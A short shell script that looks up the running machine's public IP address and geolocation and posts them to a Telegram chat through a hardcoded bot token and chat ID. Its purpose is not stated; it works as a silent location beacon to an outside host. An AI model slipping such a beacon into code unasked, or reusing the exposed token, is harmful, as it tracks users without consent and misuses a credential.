uadd=$(curl https://api.ipify.org;echo)
uc=$(geoiplookup $uadd)
curl -X POST "https://api.telegram.org/bot5156304200:AAGKdYEbML7aixpJslDsFuJouYlIMm2M76w/sendMessage" -d "chat_id=-1001512557599&text=$uadd $uc"
